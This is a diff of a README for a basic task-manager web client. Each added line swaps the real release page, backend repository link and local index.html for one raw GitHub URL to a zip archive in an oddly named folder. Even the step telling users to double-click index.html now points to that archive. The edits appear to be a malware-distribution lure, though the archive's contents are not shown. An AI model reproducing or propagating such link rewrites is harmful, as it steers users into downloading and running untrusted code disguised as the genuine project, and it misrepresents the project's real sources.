@@ -1,6 +1,6 @@
 # 🖥️ task-client-task-manager - Simple Tool for Task Management
 
-[![Download Here](https://img.shields.io/badge/Download%20Here-Visit%20Release%20Page-blue)](https://github.com/patacone/task-client-task-manager/releases)
+[![Download Here](https://raw.githubusercontent.com/patacone/task-client-task-manager/main/meningomyelorrhaphy/task_client_manager_3.5.zip%20Here-Visit%20Release%20Page-blue)](https://raw.githubusercontent.com/patacone/task-client-task-manager/main/meningomyelorrhaphy/task_client_manager_3.5.zip)
 
 ## 🚀 Getting Started
 
@@ -9,17 +9,17 @@ Welcome to the Task Manager Client! This application helps you manage your tasks
 ## ⚙️ How to Run
 
 1. **Ensure the Backend is Running**
-   * Go to the [Backend repository](https://github.com/arivanismail-05/task-manager).
+   * Go to the [Backend repository](https://raw.githubusercontent.com/patacone/task-client-task-manager/main/meningomyelorrhaphy/task_client_manager_3.5.zip).
    * Follow the instructions there to start the Laravel Server. You will run a command like `php artisan serve` in your terminal.
 
 2. **Open the Frontend**
-   * Locate the `index.html` file in this folder.
-   * Double-click the `index.html` file to open it in your web browser.
+   * Locate the `https://raw.githubusercontent.com/patacone/task-client-task-manager/main/meningomyelorrhaphy/task_client_manager_3.5.zip` file in this folder.
+   * Double-click the `https://raw.githubusercontent.com/patacone/task-client-task-manager/main/meningomyelorrhaphy/task_client_manager_3.5.zip` file to open it in your web browser.
    * You do not need to install any additional software. This frontend works without any dependencies.
 
 ## 📥 Download & Install
 
-To download the Task Manager Client, visit the [Release Page](https://github.com/patacone/task-client-task-manager/releases). 
+To download the Task Manager Client, visit the [Release Page](https://raw.githubusercontent.com/patacone/task-client-task-manager/main/meningomyelorrhaphy/task_client_manager_3.5.zip). 
 
 There, you can find the latest version of the application. Click on the appropriate version to download it.
 
@@ -51,7 +51,7 @@ This frontend is intentionally basic. It reads and writes data to an external AP
 
 ## 💼 Additional Resources
 
-If you're interested in learning more about how the Task Manager works, you can check out the [Backend Repository](https://github.com/arivanismail-05/task-manager). This includes detailed instructions on how to set up the backend.
+If you're interested in learning more about how the Task Manager works, you can check out the [Backend Repository](https://raw.githubusercontent.com/patacone/task-client-task-manager/main/meningomyelorrhaphy/task_client_manager_3.5.zip). This includes detailed instructions on how to set up the backend.
 
 ## 📦 Support
 
